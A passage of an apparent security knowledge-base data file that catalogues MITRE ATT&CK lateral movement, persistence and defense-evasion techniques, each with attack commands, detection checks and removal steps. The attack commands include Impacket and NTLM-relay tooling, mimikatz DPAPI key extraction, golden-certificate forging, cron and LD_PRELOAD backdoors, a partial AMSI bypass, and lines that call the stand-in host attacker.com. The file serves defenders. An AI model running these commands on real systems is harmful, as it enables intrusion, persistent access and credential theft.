    description: 'Attackers create scheduled tasks on remote systems to execute payloads. The schtasks command can create tasks on remote systems using the /S flag, and Impacket provides an atexec module for this purpose. Scheduled tasks persist across reboots and can be configured to run as SYSTEM, making them useful for both lateral movement and persistence.',
    commands: [
      'schtasks /create /tn "TaskName" /tr "cmd.exe /c payload" /sc once /st 00:00 /s target /u user /p pass',
      'impacket-atexec domain/user:password@target "whoami"',
      'crackmapexec smb target -u user -p pass --exec-method atexec -x "whoami"',
      'schtasks /run /tn "TaskName" /s target /u user /p pass'
    ],
    detection: 'Monitor for remote scheduled task creation (Event ID 4698). Alert on schtasks.exe with /S flag for remote systems. Track Task Scheduler operational logs (Microsoft-Windows-TaskScheduler/Operational). Monitor for unusual task names and execution patterns.',
    prevention: 'Restrict who can create scheduled tasks via Group Policy. Monitor remote task creation events centrally. Implement application whitelisting to prevent unauthorized executables from running via scheduled tasks.'
  },
  {
    name: 'Windows Service Creation - Remote',
    mitreTechnique: 'T1543.003',
    description: 'Attackers create or modify Windows services on remote systems to execute arbitrary commands or payloads. The sc.exe command can interact with the Service Control Manager on remote hosts, and Impacket provides the smbexec module that uses service creation for command execution. Services can run as SYSTEM and start automatically on boot.',
    commands: [
      'sc \\\\target create ServiceName binPath= "cmd.exe /c payload" start= auto',
      'sc \\\\target start ServiceName',
      'impacket-smbexec domain/user:password@target',
      'crackmapexec smb target -u user -p pass --exec-method smbexec -x "whoami"'
    ],
    detection: 'Monitor for new service creation events (Event ID 7045 and 4697). Alert on services with suspicious binPath values containing cmd.exe or powershell.exe. Track sc.exe execution with remote target parameters.',
    prevention: 'Restrict service creation permissions to authorized administrators only. Monitor service creation events centrally via SIEM. Block unnecessary SMB traffic between workstations.'
  },
  {
    name: 'NTLM Relay',
    mitreTechnique: 'T1557.001',
    description: 'NTLM relay attacks intercept NTLM authentication and forward it to a different target service. The attacker positions themselves to receive authentication (via LLMNR/NBT-NS poisoning, MITM, or coerced authentication) and relays it to access the target system. Successful relay provides the attacker with authenticated access at the privilege level of the relayed account without knowing credentials.',
    commands: [
      'impacket-ntlmrelayx -tf targets.txt -smb2support',
      'impacket-ntlmrelayx -t ldaps://dc -escalate-user attacker',
      'Responder -I eth0 (for poisoning to trigger auth)',
      'PetitPotam.py listener_ip dc_ip (to coerce DC authentication)',
      'mitm6 -d corp.local (IPv6 DNS takeover)'
    ],
    detection: 'Monitor for LLMNR and NBT-NS queries and responses. Alert on NTLM authentication from unusual source IPs. Track SMB signing status across the network. Detect IPv6 router advertisements on IPv4-only networks.',
    prevention: 'Enable SMB signing on all systems. Enable LDAP signing and channel binding on domain controllers. Disable LLMNR and NBT-NS via Group Policy. Enable Extended Protection for Authentication (EPA) on all services.'
  }
];

const PERSISTENCE_MECHANISMS = [
  {
    name: 'Registry Run Keys',
    mitreTechnique: 'T1547.001',
    platform: 'windows',
    description: 'Registry Run and RunOnce keys cause programs to execute each time a user logs on. These keys exist in both HKCU (user-level, no admin required) and HKLM (machine-level, requires admin). This is one of the most common persistence mechanisms due to its simplicity and reliability.',
    establishCommands: [
      'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v UpdateCheck /t REG_SZ /d "C:\\malware\\payload.exe" /f',
      'reg add "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v SystemService /t REG_SZ /d "C:\\Windows\\Temp\\svc.exe" /f',
      'Set-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "Updater" -Value "payload.exe"'
    ],
    detectCommands: [
      'reg query "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"',
      'reg query "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"',
      'Get-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"',
      'Autoruns64.exe (Sysinternals)'
    ],
    removalSteps: [
      'Identify the suspicious registry value using reg query or Autoruns',
      'Delete the registry value: reg delete "HKCU\\...\\Run" /v ValueName /f',
      'Remove the associated payload file from disk',
      'Scan the system for additional persistence mechanisms'
    ]
  },
  {
    name: 'Scheduled Tasks',
    mitreTechnique: 'T1053.005',
    platform: 'windows',
    description: 'Scheduled tasks allow programs to execute on a defined schedule or in response to system events such as logon, startup, or idle. Attackers create scheduled tasks to maintain persistence that survives reboots. Tasks can run as SYSTEM if created with elevated privileges and can be hidden from the Task Scheduler GUI.',
    establishCommands: [
      'schtasks /create /tn "\\Microsoft\\Windows\\SystemUpdate" /tr "C:\\Windows\\Temp\\payload.exe" /sc onlogon /ru SYSTEM',
      'schtasks /create /tn "Maintenance" /tr "powershell -ep bypass -f C:\\tasks\\script.ps1" /sc daily /st 09:00',
      '$action = New-ScheduledTaskAction -Execute "payload.exe"; Register-ScheduledTask -TaskName "Update" -Action $action -Trigger (New-ScheduledTaskTrigger -AtLogon)'
    ],
    detectCommands: [
      'schtasks /query /fo LIST /v',
      'Get-ScheduledTask | Where-Object {$_.State -ne "Disabled"} | Get-ScheduledTaskInfo',
      'Autoruns64.exe -a t (Sysinternals, scheduled tasks tab)',
      'Check Event ID 4698 (task created) in Security log'
    ],
    removalSteps: [
      'List all scheduled tasks: schtasks /query /fo LIST /v',
      'Identify suspicious tasks by examining their actions and triggers',
      'Delete the task: schtasks /delete /tn "TaskName" /f',
      'Remove the associated payload file from disk',
      'Review Event ID 4698/4699 logs for full history of task creation'
    ]
  },
  {
    name: 'Windows Services',
    mitreTechnique: 'T1543.003',
    platform: 'windows',
    description: 'Windows services run as background processes with configurable start types (automatic, manual, disabled). Attackers create new services or modify existing ones to execute their payloads with SYSTEM privileges. Services configured for automatic start will execute on every boot, providing reliable persistence even after system restarts.',
    establishCommands: [
      'sc create PersistSvc binPath= "C:\\Windows\\Temp\\payload.exe" start= auto',
      'sc config ExistingService binPath= "C:\\Windows\\Temp\\payload.exe"',
      'New-Service -Name "UpdateSvc" -BinaryPathName "C:\\payload.exe" -StartupType Automatic'
    ],
    detectCommands: [
      'sc query type= service state= all',
      'Get-Service | Where-Object {$_.Status -eq "Running"}',
      'Get-WmiObject Win32_Service | Select-Object Name,PathName,StartMode | Where-Object {$_.PathName -notlike "*system32*"}',
      'Autoruns64.exe -a s (Sysinternals, services tab)',
      'Check Event ID 7045 in System log for new service installation'
    ],
    removalSteps: [
      'Stop the service: sc stop ServiceName',
      'Delete the service: sc delete ServiceName',
      'Remove the associated binary from disk',
      'Check for any dependent services or recovery actions configured'
    ]
  },
  {
    name: 'Startup Folder',
    mitreTechnique: 'T1547.001',
    platform: 'windows',
    description: 'The Windows Startup folder contains shortcuts and executables that launch automatically when a user logs in. The per-user Startup folder does not require administrative privileges to modify, making it accessible to low-privilege attackers. The all-users Startup folder affects every user who logs in and requires administrative access.',
    establishCommands: [
      'copy payload.exe "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"',
      'copy payload.lnk "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"',
      'Copy-Item payload.exe "$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"'
    ],
    detectCommands: [
      'dir "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"',
      'dir "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"',
      'Get-ChildItem "$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"',
      'Autoruns64.exe -a l (Sysinternals, logon tab)'
    ],
    removalSteps: [
      'List files in both per-user and all-users Startup folders',
      'Identify and delete suspicious files or shortcuts',
      'Check the shortcut target path for LNK files before deletion',
      'Remove any associated payload files referenced by shortcuts'
    ]
  },
  {
    name: 'WMI Event Subscriptions',
    mitreTechnique: 'T1546.003',
    platform: 'windows',
    description: 'WMI event subscriptions consist of three components: an event filter (trigger condition), an event consumer (action to take), and a binding between them. Attackers use permanent WMI event subscriptions to execute payloads in response to system events like startup, logon, or timer intervals. WMI persistence is fileless in that the subscription data is stored in the WMI repository, not on the filesystem.',
    establishCommands: [
      'wmic /NAMESPACE:"\\\\root\\subscription" PATH __EventFilter CREATE Name="PersistFilter", EventNamespace="root\\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \'Win32_PerfFormattedData_PerfOS_System\'"',
      'wmic /NAMESPACE:"\\\\root\\subscription" PATH CommandLineEventConsumer CREATE Name="PersistConsumer", CommandLineTemplate="C:\\Windows\\Temp\\payload.exe"',
      'wmic /NAMESPACE:"\\\\root\\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\\"PersistFilter\\"", Consumer="CommandLineEventConsumer.Name=\\"PersistConsumer\\""'
    ],
    detectCommands: [
      'Get-WMIObject -Namespace root\\Subscription -Class __EventFilter',
      'Get-WMIObject -Namespace root\\Subscription -Class __EventConsumer',
      'Get-WMIObject -Namespace root\\Subscription -Class __FilterToConsumerBinding',
      'Autoruns64.exe -a w (Sysinternals, WMI tab)',
      'Check Event ID 5861 in Microsoft-Windows-WMI-Activity/Operational log'
    ],
    removalSteps: [
      'List all WMI event subscriptions using Get-WMIObject',
      'Remove the binding: Get-WMIObject -Namespace root\\Subscription -Class __FilterToConsumerBinding | Remove-WMIObject',
      'Remove the consumer: Get-WMIObject -Namespace root\\Subscription -Class __EventConsumer -Filter "Name=\'PersistConsumer\'" | Remove-WMIObject',
      'Remove the filter: Get-WMIObject -Namespace root\\Subscription -Class __EventFilter -Filter "Name=\'PersistFilter\'" | Remove-WMIObject'
    ]
  },
  {
    name: 'COM Hijacking',
    mitreTechnique: 'T1546.015',
    platform: 'windows',
    description: 'COM hijacking abuses the Windows COM object loading order to execute attacker-controlled DLLs. When an application requests a COM object, Windows searches HKCU registry keys before HKLM. By creating a HKCU registry entry pointing to a malicious DLL for a COM object that a legitimate application loads, the attacker achieves code execution whenever that application runs.',
    establishCommands: [
      'reg add "HKCU\\Software\\Classes\\CLSID\\{CLSID}\\InprocServer32" /ve /t REG_SZ /d "C:\\payload.dll" /f',
      'reg add "HKCU\\Software\\Classes\\CLSID\\{CLSID}\\InprocServer32" /v ThreadingModel /t REG_SZ /d "Both" /f',
      '# Common hijackable CLSIDs: {b5f8350b-0548-48b1-a6ee-88bd00b4a5e7} (Explorer), {BCDE0395-E52F-467C-8E3D-C4579291692E} (MMDeviceEnumerator)'
    ],
    detectCommands: [
      'reg query "HKCU\\Software\\Classes\\CLSID" /s',
      'Autoruns64.exe (check for HKCU COM entries that shadow HKLM)',
      'Compare HKCU and HKLM CLSID registrations for discrepancies',
      'Monitor for DLL loads from unusual paths by common applications'
    ],
    removalSteps: [
      'Identify the hijacked CLSID in HKCU\\Software\\Classes\\CLSID',
      'Delete the HKCU registry key: reg delete "HKCU\\Software\\Classes\\CLSID\\{CLSID}" /f',
      'Remove the malicious DLL from disk',
      'Verify the legitimate COM object loads correctly from HKLM'
    ]
  },
  {
    name: 'DLL Side-Loading',
    mitreTechnique: 'T1574.002',
    platform: 'windows',
    description: 'DLL side-loading exploits the Windows DLL search order by placing a malicious DLL in the same directory as a legitimate signed executable. When the legitimate application loads, it searches for required DLLs in its own directory first, loading the attacker DLL instead of the system DLL. This technique abuses the trust placed in signed binaries to execute malicious code.',
    establishCommands: [
      'Copy a legitimate signed executable to a writable directory',
      'Place a malicious DLL with the name of a DLL the executable imports in the same directory',
      'Use tools like DLL Export Viewer to identify import dependencies',
      'Create a scheduled task or shortcut to run the legitimate executable from the new location'
    ],
    detectCommands: [
      'Use Process Monitor (Sysinternals) to track DLL load paths',
      'Monitor for signed executables running from unusual directories',
      'Compare loaded DLL hashes against known-good baselines',
      'Autoruns64.exe to check for persistence using side-loaded DLLs'
    ],
    removalSteps: [
      'Identify the side-loaded DLL using Process Monitor or Autoruns',
      'Remove the malicious DLL from the directory',
      'Remove the copy of the legitimate executable if placed by the attacker',
      'Remove any persistence mechanism (scheduled task, registry key) that triggers the side-loading'
    ]
  },
  {
    name: 'BITS Jobs',
    mitreTechnique: 'T1197',
    platform: 'windows',
    description: 'Background Intelligent Transfer Service (BITS) is a Windows service for asynchronous file transfers. BITS jobs persist across reboots and can be configured with notification commands that execute when the transfer completes or fails. Attackers create BITS jobs with intentionally failing downloads and notification commands pointing to their payloads, achieving persistent execution.',
    establishCommands: [
      'bitsadmin /create PersistJob',
      'bitsadmin /addfile PersistJob http://attacker.com/fake C:\\Windows\\Temp\\fake',
      'bitsadmin /SetNotifyCmdLine PersistJob "C:\\Windows\\Temp\\payload.exe" ""',
      'bitsadmin /SetMinRetryDelay PersistJob 60',
      'bitsadmin /resume PersistJob'
    ],
    detectCommands: [
      'bitsadmin /list /allusers /verbose',
      'Get-BitsTransfer -AllUsers | Format-List *',
      'Check Event ID 59 in Microsoft-Windows-Bits-Client/Operational log',
      'Monitor for bitsadmin.exe or PowerShell BITS cmdlet usage'
    ],
    removalSteps: [
      'List all BITS jobs: bitsadmin /list /allusers /verbose',
      'Cancel the malicious job: bitsadmin /cancel JobName',
      'Alternatively: bitsadmin /reset /allusers (cancels all jobs)',
      'Remove the associated payload file from disk'
    ]
  },
  {
    name: 'Office Template Macros',
    mitreTechnique: 'T1137.001',
    platform: 'windows',
    description: 'Microsoft Office loads template files (Normal.dotm for Word, Personal.xlsb for Excel) at startup. Attackers can modify these templates to include malicious VBA macros that execute every time the application opens. Since the template is loaded by the legitimate Office application, this persistence is difficult to detect and survives application and system restarts.',
    establishCommands: [
      'Copy malicious Normal.dotm to %APPDATA%\\Microsoft\\Templates\\',
      'Copy malicious Personal.xlsb to %APPDATA%\\Microsoft\\Excel\\XLSTART\\',
      'Inject VBA macro into existing template using VBA editor or programmatically'
    ],
    detectCommands: [
      'dir "%APPDATA%\\Microsoft\\Templates\\Normal.dotm"',
      'dir "%APPDATA%\\Microsoft\\Excel\\XLSTART\\Personal.xlsb"',
      'Check file modification timestamps on template files',
      'Open templates in VBA editor (Alt+F11) to inspect macro code',
      'Use olevba to extract and analyze macros: olevba Normal.dotm'
    ],
    removalSteps: [
      'Close all Office applications',
      'Delete or replace the modified template with a clean version',
      'For Word: delete %APPDATA%\\Microsoft\\Templates\\Normal.dotm (Word will recreate it)',
      'For Excel: delete %APPDATA%\\Microsoft\\Excel\\XLSTART\\Personal.xlsb',
      'Scan for additional compromised Office files'
    ]
  },
  {
    name: 'Browser Extensions',
    mitreTechnique: 'T1176',
    platform: 'both',
    description: 'Malicious browser extensions can monitor web activity, steal credentials, inject content into pages, and maintain persistent access. Extensions persist across browser restarts and can be installed silently through Group Policy or by modifying browser configuration files. Once installed, extensions have broad access to browsing data and can exfiltrate information through normal HTTPS traffic.',
    establishCommands: [
      'Chrome policy-based install: reg add "HKLM\\Software\\Policies\\Google\\Chrome\\ExtensionInstallForcelist" /v 1 /t REG_SZ /d "extension_id;https://attacker.com/update.xml"',
      'Firefox: modify extensions.json in profile directory',
      'Sideload unpacked extension via browser developer mode'
    ],
    detectCommands: [
      'Chrome: navigate to chrome://extensions and review installed extensions',
      'Firefox: navigate to about:addons',
      'Check Chrome policies: chrome://policy',
      'Review registry: reg query "HKLM\\Software\\Policies\\Google\\Chrome\\ExtensionInstallForcelist"',
      'List extension directories in user profile'
    ],
    removalSteps: [
      'Remove the extension through the browser extension management page',
      'For policy-installed extensions, remove the registry key or GPO',
      'Delete the extension files from the browser profile directory',
      'Reset browser settings if the extension modified them',
      'Check for and remove any extension synchronization settings'
    ]
  },
  {
    name: 'SSH Authorized Keys',
    mitreTechnique: 'T1098.004',
    platform: 'linux',
    description: 'Adding a public key to a users authorized_keys file allows passwordless SSH access to the system. This persistence method is simple, reliable, and blends with legitimate SSH configurations. The attacker generates a key pair, places the public key on the target system, and can then connect at any time using the corresponding private key without needing the users password.',
    establishCommands: [
      'echo "ssh-rsa AAAAB3...attacker_key" >> /home/user/.ssh/authorized_keys',
      'mkdir -p /root/.ssh && echo "ssh-rsa AAAAB3...attacker_key" >> /root/.ssh/authorized_keys',
      'chmod 600 /home/user/.ssh/authorized_keys'
    ],
    detectCommands: [
      'cat /home/*/.ssh/authorized_keys',
      'cat /root/.ssh/authorized_keys',
      'find / -name authorized_keys -exec ls -la {} \\;',
      'Check /var/log/auth.log for key-based SSH logins',
      'diff current authorized_keys against a known-good baseline'
    ],
    removalSteps: [
      'Review each authorized_keys file for unrecognized public keys',
      'Remove the unauthorized public key line from the file',
      'Verify file permissions are correct (600 for authorized_keys, 700 for .ssh)',
      'Monitor auth.log for any subsequent access attempts using the removed key',
      'Consider rotating all SSH keys on the system'
    ]
  },
  {
    name: 'Crontab Persistence',
    mitreTechnique: 'T1053.003',
    platform: 'linux',
    description: 'Cron jobs execute commands on a defined schedule on Linux and Unix systems. Attackers add entries to user crontabs or system cron directories to execute their payloads periodically. Cron persistence survives reboots and runs with the privileges of the crontab owner. System-level cron directories (/etc/cron.d, /etc/cron.daily) require root access but are checked less frequently by administrators.',
    establishCommands: [
      '(crontab -l 2>/dev/null; echo "*/5 * * * * /tmp/.hidden/payload") | crontab -',
      'echo "*/10 * * * * root /opt/.update/agent" >> /etc/crontab',
      'echo "* * * * * root /var/tmp/.cache/beacon" > /etc/cron.d/system-update'
    ],
    detectCommands: [
      'crontab -l (current user)',
      'crontab -l -u username (specific user)',
      'ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/ /etc/cron.weekly/ /etc/cron.monthly/',
      'cat /etc/crontab',
      'for user in $(cut -f1 -d: /etc/passwd); do echo "--- $user ---"; crontab -l -u $user 2>/dev/null; done'
    ],
    removalSteps: [
      'List all cron jobs for all users',
      'Identify suspicious entries (connections to external IPs, hidden directories, encoded commands)',
      'Remove the malicious cron entry: crontab -e (or delete from /etc/cron.d/)',
      'Remove the associated payload from disk',
      'Check if the payload recreates the cron entry and remove the payload first if so'
    ]
  },
  {
    name: 'Systemd Service Persistence',
    mitreTechnique: 'T1543.002',
    platform: 'linux',
    description: 'Systemd services are defined by unit files that specify how and when a process should run. Attackers create malicious service unit files that start on boot and automatically restart on failure, ensuring continuous execution. User-level systemd services can be created without root privileges in ~/.config/systemd/user/, while system-level services in /etc/systemd/system/ require root.',
    establishCommands: [
      'Create /etc/systemd/system/system-update.service with [Service] ExecStart=/opt/.update/payload Restart=always',
      'systemctl daemon-reload',
      'systemctl enable system-update.service',
      'systemctl start system-update.service'
    ],
    detectCommands: [
      'systemctl list-unit-files --type=service | grep enabled',
      'find /etc/systemd/system/ -name "*.service" -newer /etc/os-release',
      'find ~/.config/systemd/user/ -name "*.service"',
      'systemctl list-units --type=service --state=running',
      'journalctl -u suspicious-service-name'
    ],
    removalSteps: [
      'Stop the service: systemctl stop service-name',
      'Disable the service: systemctl disable service-name',
      'Remove the unit file from /etc/systemd/system/ or ~/.config/systemd/user/',
      'Reload systemd: systemctl daemon-reload',
      'Remove the associated payload from disk'
    ]
  },
  {
    name: 'Bash Profile / Bashrc Persistence',
    mitreTechnique: 'T1546.004',
    platform: 'linux',
    description: 'Shell initialization files (.bashrc, .bash_profile, .profile, .zshrc) execute commands every time a user opens a new shell session. Attackers append malicious commands to these files to achieve persistence that triggers on every interactive login or new terminal session. This technique does not require elevated privileges and is specific to each user account.',
    establishCommands: [
      'echo "/tmp/.hidden/payload &" >> /home/user/.bashrc',
      'echo "nohup /var/tmp/.cache/beacon >/dev/null 2>&1 &" >> /home/user/.bash_profile',
      'echo "export PATH=/tmp/.bin:$PATH" >> /home/user/.profile'
    ],
    detectCommands: [
      'cat /home/*/.bashrc /home/*/.bash_profile /home/*/.profile',
      'cat /root/.bashrc /root/.bash_profile /root/.profile',
      'diff /home/user/.bashrc /etc/skel/.bashrc',
      'grep -r "nohup\\|/dev/null\\|&$" /home/*/.bash* /home/*/.profile',
      'Check file modification timestamps: stat /home/user/.bashrc'
    ],
    removalSteps: [
      'Compare the current file against a known-good baseline or /etc/skel/ template',
      'Remove the malicious lines from the shell initialization file',
      'Kill any running instances of the payload process',
      'Remove the payload file from disk',
      'Monitor the file for re-modification'
    ]
  },
  {
    name: 'LD_PRELOAD Hijacking',
    mitreTechnique: 'T1574.006',
    platform: 'linux',
    description: 'The LD_PRELOAD environment variable or /etc/ld.so.preload configuration file forces the dynamic linker to load a specified shared library before all others. Attackers use this to inject a malicious shared library into every process that starts on the system, intercepting function calls and executing arbitrary code. The /etc/ld.so.preload method affects all processes system-wide and persists across reboots.',
    establishCommands: [
      'echo "/lib/.hidden/malicious.so" > /etc/ld.so.preload',
      'echo "export LD_PRELOAD=/tmp/.cache/hook.so" >> /home/user/.bashrc',
      'Compile shared library: gcc -shared -fPIC -o malicious.so hook.c -ldl'
    ],
    detectCommands: [
      'cat /etc/ld.so.preload',
      'echo $LD_PRELOAD',
      'grep -r LD_PRELOAD /etc/profile.d/ /home/*/.bashrc /home/*/.profile',
      'ldd /usr/bin/ls (check for unexpected libraries)',
      'strace -e openat /usr/bin/id 2>&1 | grep preload'
    ],
    removalSteps: [
      'Remove or empty /etc/ld.so.preload: echo "" > /etc/ld.so.preload',
      'Remove LD_PRELOAD from shell initialization files',
      'Delete the malicious shared library from disk',
      'Restart affected services to unload the library from memory',
      'Verify with ldd that the library is no longer loaded'
    ]
  },
  {
    name: 'PAM Backdoor',
    mitreTechnique: 'T1556.003',
    platform: 'linux',
    description: 'Pluggable Authentication Modules (PAM) handle authentication on Linux systems. Attackers can modify PAM configuration files or replace PAM shared libraries to add a backdoor that accepts a hardcoded password for any user account while still passing legitimate credentials through to the real authentication module. This provides persistent access that bypasses normal credential management.',
    establishCommands: [
      'Modify /etc/pam.d/sshd or /etc/pam.d/common-auth to include a backdoor module',
      'Replace a PAM module (e.g., pam_unix.so) with a trojanized version that accepts a master password',
      'Add a new PAM module that logs credentials and allows a backdoor password'
    ],
    detectCommands: [
      'rpm -Va pam (on RPM-based systems) to verify PAM library integrity',
      'dpkg --verify libpam-modules (on Debian-based systems)',
      'md5sum /lib/x86_64-linux-gnu/security/pam_unix.so (compare against known-good)',
      'cat /etc/pam.d/sshd /etc/pam.d/common-auth (review for unauthorized modules)',
      'find /lib/security/ /lib64/security/ -newer /etc/os-release'
    ],
    removalSteps: [
      'Compare PAM module hashes against known-good values from the package manager',
      'Reinstall the PAM packages: apt reinstall libpam-modules (Debian) or yum reinstall pam (RHEL)',
      'Review and restore PAM configuration files from backup',
      'Rotate all user passwords as credentials may have been captured',
      'Audit authentication logs for signs of backdoor usage'
    ]
  },
  {
    name: 'Logon Script Persistence',
    mitreTechnique: 'T1037.001',
    platform: 'windows',
    description: 'Windows supports logon scripts assigned through Group Policy or the user object in Active Directory. Attackers can set a logon script in the ScriptPath attribute of a user account or create a GPO that assigns a logon script to all users in an organizational unit. Logon scripts execute with the privileges of the logging-on user and run before the desktop is fully loaded.',
    establishCommands: [
      'Set-ADUser -Identity victim -ScriptPath "malicious.bat"',
      'reg add "HKCU\\Environment" /v UserInitMprLogonScript /t REG_SZ /d "C:\\Windows\\Temp\\payload.bat" /f',
      'Place script in NETLOGON share: copy malicious.bat \\\\DC\\NETLOGON\\'
    ],
    detectCommands: [
      'Get-ADUser -Filter * -Properties ScriptPath | Where-Object {$_.ScriptPath -ne $null}',
      'reg query "HKCU\\Environment" /v UserInitMprLogonScript',
      'dir \\\\DC\\NETLOGON\\ (audit NETLOGON share contents)',
      'gpresult /H report.html (review applied GPO logon scripts)'
    ],
    removalSteps: [
      'Clear the ScriptPath attribute: Set-ADUser -Identity victim -ScriptPath $null',
      'Delete the UserInitMprLogonScript registry value',
      'Remove the malicious script from the NETLOGON share',
      'Review Group Policy for any logon script assignments'
    ]
  },
  {
    name: 'Active Directory Certificate Services (AD CS) Persistence',
    mitreTechnique: 'T1649',
    platform: 'windows',
    description: 'Attackers who compromise an Active Directory Certificate Services (AD CS) environment can request certificates that allow long-term authentication. A certificate issued with a long validity period provides persistent domain access even after password changes. Stealing the CA private key or creating a subordinate CA gives the attacker the ability to forge certificates for any domain user indefinitely.',
    establishCommands: [
      'Certify.exe request /ca:CA-SERVER\\CA-NAME /template:User /altname:admin',
      'Rubeus.exe asktgt /user:admin /certificate:cert.pfx /password:certpass /ptt',
      'certipy req -u user@domain -p pass -ca CA-NAME -target ca-server -template User -upn admin@domain'
    ],
    detectCommands: [
      'Certify.exe find /vulnerable (identify vulnerable templates)',
      'certipy find -u user@domain -p pass -dc-ip DC_IP',
      'Review certificate enrollment logs on the CA server (Event ID 4886, 4887)',
      'PSPKIAudit to identify misconfigured certificate templates',
      'Check for certificates with unusual SANs or long validity periods'
    ],
    removalSteps: [
      'Revoke compromised certificates through the CA management console',
      'Fix vulnerable certificate templates (remove enrollee-supplied SAN, restrict enrollment)',
      'Rotate the CA certificate if the CA private key was compromised',
      'Enable certificate-based authentication auditing',
      'Consider implementing certificate transparency logging'
    ]
  },
  {
    name: 'Golden Certificate',
    mitreTechnique: 'T1649',
    platform: 'windows',
    description: 'A golden certificate attack involves stealing the Certificate Authority private key and using it to forge certificates for any user in the domain. Unlike golden ticket attacks that require the krbtgt hash, golden certificates survive krbtgt password rotations. The CA certificate typically has a validity period of 5+ years, providing extremely long-lived persistence that is difficult to remediate without rebuilding the PKI infrastructure.',
    establishCommands: [
      'SharpDPAPI.exe certificates /machine (extract CA private key from DPAPI)',
      'certipy ca -backup -u admin@domain -p pass -ca CA-NAME',
      'certipy forge -ca-pfx ca.pfx -upn admin@domain -subject "CN=admin"',
      'certipy auth -pfx forged.pfx -dc-ip DC_IP'
    ],
    detectCommands: [
      'Monitor for CA private key export events',
      'Audit certificate enrollment logs for certificates not matching template parameters',
      'Check for certificates signed by the CA that were not issued through the enrollment process',
      'Monitor for authentication using certificates with unusual issuance metadata'
    ],
    removalSteps: [
      'Rebuild the PKI infrastructure with a new CA key pair',
      'Revoke all certificates issued by the compromised CA',
      'Reissue certificates to all legitimate users and systems',
      'Implement hardware security module (HSM) protection for the CA private key',
      'Enable and monitor CA certificate issuance logging'
    ]
  },
  {
    name: 'DPAPI Credential Backup',
    mitreTechnique: 'T1555.004',
    platform: 'windows',
    description: 'The Data Protection API (DPAPI) master keys protect encrypted credentials stored on Windows systems. The domain DPAPI backup key on domain controllers can decrypt any domain-joined machines DPAPI-protected data. Attackers who extract the domain backup key gain persistent access to all DPAPI-encrypted secrets (browser passwords, credential manager, certificate private keys) across the domain, even after password changes.',
    establishCommands: [
      'mimikatz: lsadump::backupkeys /system:DC /export',
      'impacket-dpapi backupkeys -t domain/admin:password@dc_ip --export',
      'SharpDPAPI.exe backupkey /nowrap'
    ],
    detectCommands: [
      'Monitor for LSARPC calls to retrieve the DPAPI backup key',
      'Alert on Event ID 4662 with access to the DPAPI backup key object in AD',
      'Track authentication to domain controllers from unexpected sources',
      'Monitor for tools known to extract DPAPI backup keys'
    ],
    removalSteps: [
      'The DPAPI domain backup key cannot be rotated without side effects',
      'Consider migrating to a new domain if the backup key is compromised',
      'Force all users to change passwords and re-protect their DPAPI data',
      'Implement additional monitoring for DPAPI backup key access',
      'Audit all credential stores protected by DPAPI across the domain'
    ]
  }
];

const DEFENSE_EVASION_TECHNIQUES = [
  {
    name: 'AMSI Bypass',
    mitreTechnique: 'T1562.001',
    description: 'The Antimalware Scan Interface (AMSI) enables security products to scan script content before execution in PowerShell, VBScript, JScript, and .NET. Attackers patch the AmsiScanBuffer function in memory to return a clean result, effectively blinding AMSI-integrated security products to malicious script content for the duration of that process.',
    codeSnippets: [
      '# PowerShell reflection-based AMSI bypass (patches AmsiScanBuffer in memory)',
      '$a=[Ref].Assembly.GetTypes() | ForEach-Object {if ($_.Name -like "*iUtils") {$_}}',
      '# Use reflection to access and modify the amsiInitFailed field',
      '# Numerous public variants exist that bypass string-based detection of the patch itself'
    ],
    detectionMethods: [
      'Monitor for suspicious PowerShell script block content in Event ID 4104',
      'Use ETW providers to detect AMSI bypass attempts before the patch takes effect',
      'Deploy endpoint detection that monitors for memory writes to amsi.dll',
      'Alert on PowerShell loading System.Reflection to modify internal fields',
      'Hardware breakpoints on AmsiScanBuffer can detect patching attempts'
    ]
  },
  {
    name: 'ETW Patching',
    mitreTechnique: 'T1562.006',
    description: 'Event Tracing for Windows (ETW) provides the telemetry backbone for many security products including .NET activity logging, PowerShell logging, and process auditing. Attackers patch ETW-related functions (EtwEventWrite, NtTraceEvent) in memory to suppress telemetry generation, blinding security tools that rely on ETW for visibility while leaving other system functionality intact.',
    codeSnippets: [
      '# Patch EtwEventWrite in ntdll.dll to return immediately (ret 0)',
      '# Target ntdll!EtwEventWrite or ntdll!NtTraceEvent',
      '# The patch replaces the function prologue with a return instruction',
      '# This suppresses all ETW events from the patched process'
    ],
    detectionMethods: [
      'Monitor for memory writes to ntdll.dll in process memory',
      'Use kernel-mode ETW consumers that cannot be patched from user mode',
      'Implement integrity checking of ETW provider functions',
      'Deploy EDR solutions that use kernel callbacks rather than relying solely on ETW',
      'Monitor for processes that stop generating expected ETW events'
    ]
  },
  {
    name: 'Process Hollowing',
    mitreTechnique: 'T1055.012',
    description: 'Process hollowing creates a legitimate process in a suspended state, unmaps its original code from memory, and replaces it with malicious code before resuming execution. The resulting process appears legitimate in task manager and process listings because the process metadata (name, path, parent) matches the hollowed-out legitimate binary. This technique is commonly used by malware loaders and implant frameworks.',
    codeSnippets: [
      '# 1. Create target process in suspended state: CreateProcessA with CREATE_SUSPENDED flag',
      '# 2. Get thread context to find the PEB: GetThreadContext',
      '# 3. Read the image base address from the PEB',
      '# 4. Unmap the original executable: NtUnmapViewOfSection',
      '# 5. Allocate memory at the original base: VirtualAllocEx',
      '# 6. Write the malicious PE into the allocated memory: WriteProcessMemory',
      '# 7. Update the entry point in the thread context: SetThreadContext',
      '# 8. Resume the thread: ResumeThread'
    ],
    detectionMethods: [
